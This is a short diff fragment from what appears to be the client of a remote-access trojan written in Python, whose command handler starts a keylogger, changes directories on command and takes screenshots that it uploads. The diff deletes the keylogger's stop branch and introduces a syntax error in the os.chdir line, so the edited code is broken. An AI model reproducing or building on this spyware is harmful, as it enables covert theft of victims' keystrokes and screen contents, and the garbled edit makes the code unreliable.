@@ -41,10 +41,10 @@ class Clients:
             elif RecvMessage == '!Keylogger':
                 with keyboard.Listener(on_press=on_press) as listener:
                     listener.join()
-                    if RecvMessage == '!Keyloggerstop':
-                        exit()
+          
+
             elif RecvMessage[:4] == '!cd ':
-                os.chdir((RecvMessage[4:]))
+                os.chdir((RecvMessage[4:])
             elif RecvMessage == '!Screenshot':
                 screenshot = pyautogui.screenshot('Screenshot.png')
                 upload_file(file='Screenshot.png')
